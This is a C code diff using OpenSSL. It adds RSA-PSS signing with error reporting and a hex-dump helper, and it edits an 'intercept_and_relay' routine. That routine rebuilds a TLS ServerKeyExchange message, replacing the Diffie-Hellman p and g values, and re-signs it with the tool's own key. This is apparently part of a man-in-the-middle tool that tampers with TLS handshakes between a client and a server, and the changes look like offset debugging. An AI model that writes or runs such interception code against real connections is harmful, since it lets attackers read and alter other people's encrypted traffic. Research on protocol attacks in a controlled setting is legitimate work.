@@ -106,20 +106,58 @@ EVP_PKEY *load_private_key(const char *keyfile) {
 
 int sign_data(EVP_PKEY *pkey, const unsigned char *data, size_t data_len, unsigned char *sig, size_t *sig_len) {
     EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
-    if (!mdctx) return 0;
-    
-    if (EVP_DigestSignInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
-        EVP_MD_CTX_free(mdctx);
+    if (!mdctx) {
+        ERR_print_errors_fp(stderr); 
         return 0;
     }
     
+    // Initialize the digest and signature context with RSA-PSS and SHA-256
+    if (EVP_DigestSignInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
+        ERR_print_errors_fp(stderr); 
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    EVP_PKEY_CTX *pkey_ctx = EVP_MD_CTX_pkey_ctx(mdctx);
+
+    if (EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, RSA_PKCS1_PSS_PADDING) != 1) {
+            ERR_print_errors_fp(stderr);
+            EVP_MD_CTX_free(mdctx);
+            return 0;
+    }
+    if (EVP_PKEY_CTX_set_rsa_pss_saltlen(pkey_ctx, EVP_MD_size(EVP_sha256())) != 1) {
+            ERR_print_errors_fp(stderr); 
+            EVP_MD_CTX_free(mdctx);
+            return 0;
+    }
+
+    // Perform the signature operation
     if (EVP_DigestSign(mdctx, sig, sig_len, data, data_len) != 1) {
+        ERR_print_errors_fp(stderr);
         EVP_MD_CTX_free(mdctx);
         return 0;
     }
     
     EVP_MD_CTX_free(mdctx);
     return 1;
+}
+
+
+void print_buffer(const unsigned char *buf, size_t len) {
+    if (buf == NULL || len == 0) {
+        printf("Buffer is NULL or empty\n");
+        return;
+    }
+
+    for (size_t i = 0; i < len; i++) {
+        printf("%02x ", buf[i]);
+        
+        // Optional: Print a newline every 16 bytes for better readability
+        if ((i + 1) % 16 == 0) {
+            printf("\n");
+        }
+    }
+    printf("\n");
 }
 
 // Message callback function to capture and print handshake messages
@@ -257,20 +295,25 @@ void intercept_and_relay(int client_sock, const char *server_host, int server_po
         size_t modified_server_key_exchange_len = 0;
 
         // Construct the signature data (p)
-        memcpy(p, skx_prefix + 11, sizeof(skx_prefix)-11);
-        memcpy(p + sizeof(skx_prefix)-11, server_key_exchange, 9);
-        p_len = sizeof(skx_prefix)-2;
+        memcpy(p, skx_prefix + 9, sizeof(skx_prefix)-9);
+        memcpy(p + sizeof(skx_prefix)-9, server_key_exchange, 9);
+        p_len = sizeof(skx_prefix);
 
         // Construct the signature data (g)
-        memcpy(g, server_key_exchange + 11, 84);
+        memcpy(g, server_key_exchange + 9, 86);
+        g_len = 86;
 
         // Construct the signature data (client_random, server_random, p, g, Ys)
         memcpy(server_signature, client_random, 32);
         memcpy(server_signature + 32, random, 32);
         memcpy(server_signature + 64, p, p_len);
-        memcpy(server_signature + 64 + p_len, g, 84);
-        server_signature[64 + p_len + 84] = 0x01;
-        server_signature_len = 64 + p_len + 84 + 1;
+        memcpy(server_signature + 64 + p_len, g, 86);
+        server_signature[64 + p_len + 86] = 0x00;
+        server_signature[64 + p_len + 87] = 0x01;
+        server_signature[64 + p_len + 88] = 0x01;
+        server_signature_len = 64 + p_len + 89;
+        print_buffer(server_signature, server_signature_len);
+        printf("Server Signature Length: %zu\n", server_signature_len);
         sign_data(pkey, server_signature, server_signature_len, server_signature, &server_signature_len);
 
         // Construct the signature data (Prefix)
